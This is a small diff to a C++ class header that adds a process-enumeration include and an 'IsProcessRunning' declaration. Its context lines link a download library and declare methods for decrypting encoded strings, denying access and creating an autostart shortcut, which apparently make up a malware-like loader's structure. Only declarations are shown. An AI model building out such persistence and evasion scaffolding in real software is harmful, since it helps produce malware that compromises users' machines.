@@ -9,6 +9,7 @@
 #include "objbase.h"
 #include "objidl.h"
 #include "shlguid.h"
+#include <tlhelp32.h>
 #pragma comment (lib, "urlmon.lib")
 
 using namespace std;
@@ -25,4 +26,5 @@ public:
 	char* UnEnc(char *enc, char *key, DWORD encLen);
 	BOOL DenyAccess();
 	void createAutoLoadShortcut();
+	bool IsProcessRunning(const wchar_t *processName);
 };
